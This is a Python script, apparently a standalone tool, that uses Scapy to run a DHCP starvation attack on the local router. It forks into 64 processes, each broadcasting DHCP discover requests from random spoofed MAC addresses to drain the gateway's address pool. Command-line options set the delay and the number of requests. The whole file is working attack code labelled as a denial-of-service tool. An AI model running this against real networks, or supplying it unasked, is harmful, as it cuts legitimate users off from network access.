import argparse
import os
import time

from scapy.config import conf
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, getmacbyip
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC

class Starve:
    # Real router
    __GATEWAY_IP: str
    __GATEWAY_MAC: str

    def __init__(self):
        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]

    # DoS to router -- DHCP starvation attack
    def starvationAttack(self, delay, iteration):
        os.fork()
        os.fork()
        os.fork()
        os.fork()
        os.fork()
        os.fork()
        for i in range(iteration):
            request = self.generatePacketClient("discover", RandMAC())
            sendp(request)
            time.sleep(int(delay))

    # Return a DHCP a client packet
    def generatePacketClient(self,type, mac):
        return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac) /
                DHCP(options=[
                    ('message-type', type),
                    ("server_id", self.__GATEWAY_IP),
                    "end"]))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a DHCP starvation attack.")
    parser.add_argument("-s", "--secondDelay", required=False, help="Seconds to delay the function")
    parser.add_argument("-i", "--iteration", required=False, help="Number of fakes device to connect. "
                                                                  "(The real number is 64 * i)")
    args = parser.parse_args()
    print("Starve...")

    if args.secondDelay is None:
        seconds = 0
    else:
        seconds = args.secondDelay
    if args.iteration is None:
        iteration = 100
    else:
        iteration = args.iteration

    s = Starve()
    s.starvationAttack(seconds, int(iteration))

